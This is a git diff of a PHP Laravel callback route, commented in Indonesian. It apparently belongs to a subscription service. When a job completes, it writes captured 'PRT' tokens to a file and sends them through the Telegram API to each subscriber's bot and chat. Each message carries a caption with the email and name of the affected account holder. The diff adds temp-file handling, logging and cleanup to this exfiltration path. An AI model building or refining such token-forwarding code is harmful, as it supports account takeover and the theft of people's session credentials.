@@ -96,14 +96,12 @@ Route::post('/python/callback', function (Request $request) {
     $job->update([
         'status' => $request->status,
         'result' => $result,
-        'error' => $request->status === 'failed'
-            ? $request->error
-            : $job->error,
+        'error' => $request->status === 'failed' ? $request->error : $job->error,
     ]);
 
     /*
     |--------------------------------------------------------------------------
-    | SAVE TOKEN (ONLY WHEN DONE)
+    | SAVE TOKEN & SEND TO TELEGRAM
     |--------------------------------------------------------------------------
     */
     if ($request->status === 'done') {
@@ -135,32 +133,33 @@ Route::post('/python/callback', function (Request $request) {
                 ]);
             }
 
-            // 🔥 Ambil user
             $user = $job->user;
 
-            // 🔥 Cek subscription expired (lebih dari 30 hari dari created_at)
+            // 🔥 Cek subscription expired
             if ($user && !$user->isSubscriptionExpired()) {
 
                 $settings = $user->settings;
 
                 if ($settings && $settings->telegram_id_1 && $settings->telegram_bot_1) {
+
                     $telegramId = $settings->telegram_id_1;
                     $botToken = $settings->telegram_bot_1;
 
-                    // 🔥 Buat file hanya berisi PRT
-                    $fileContent = json_encode($data['prt'] ?? []);
-                    $filePath = storage_path("app/public/{$job->id}_prt.txt");
-                    file_put_contents($filePath, $fileContent);
+                    // 🔹 Pastikan folder temporary ada
+                    $tmpFolder = storage_path('app/telegram_tmp');
+                    if (!is_dir($tmpFolder))
+                        mkdir($tmpFolder, 0777, true);
 
-                    // 🔥 Caption berisi email dan name
-                    $caption = "Email: {$email}\nName: {$name}";
+                    // 🔹 Buat file sementara hanya berisi PRT
+                    $filePath = $tmpFolder . "/{$job->id}_prt.txt";
+                    file_put_contents($filePath, json_encode($data['prt'] ?? []));
 
-                    // 🔥 Kirim file ke Telegram
+                    // 🔹 Kirim ke Telegram
                     $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendDocument";
                     $postFields = [
                         'chat_id' => $telegramId,
                         'document' => new \CURLFile($filePath),
-                        'caption' => $caption
+                        'caption' => "Email: {$email}\nName: {$name}"
                     ];
 
                     $ch = curl_init();
@@ -169,10 +168,21 @@ Route::post('/python/callback', function (Request $request) {
                     curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                     $response = curl_exec($ch);
+
+                    if ($response === false) {
+                        Log::error('Telegram sendDocument failed: ' . curl_error($ch));
+                    } else {
+                        Log::info('Telegram sent successfully', ['response' => $response]);
+                    }
+
                     curl_close($ch);
 
-                    Log::info("Telegram sent to {$telegramId}", ['response' => $response]);
+                    // 🔹 Hapus file sementara setelah dikirim
+                    if (file_exists($filePath)) {
+                        unlink($filePath);
+                    }
                 }
+
             } else {
                 Log::info("User {$user->id} subscription expired, telegram not sent.");
             }
